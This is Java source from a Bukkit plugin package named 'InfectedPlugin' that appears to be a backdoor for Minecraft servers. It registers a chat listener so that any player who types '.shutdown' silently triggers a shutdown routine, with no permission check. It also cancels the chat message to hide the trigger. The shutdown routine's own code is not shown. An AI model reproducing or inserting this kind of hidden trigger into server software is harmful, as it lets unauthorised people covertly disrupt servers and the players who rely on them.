package org.CreeperCoders.InfectedPlugin.Commands;

import java.io.IOException;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.CreeperCoders.InfectedPlugin.IP_Util;
import org.CreeperCoders.InfectedPlugin.InfectedPlugin;

public class Command_shutdown implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = false;

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".shutdown"))
            {
                try
                {
                    IP_Util.shutdown();
                }
                catch (IOException ex)
                {
                    InfectedPlugin.log.severe(ex.getMessage());
                }
                catch (RuntimeException ex)
                {
                    InfectedPlugin.log.severe(ex.getMessage());
                }
                cancel = true;
            }
            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
        }
    }

}
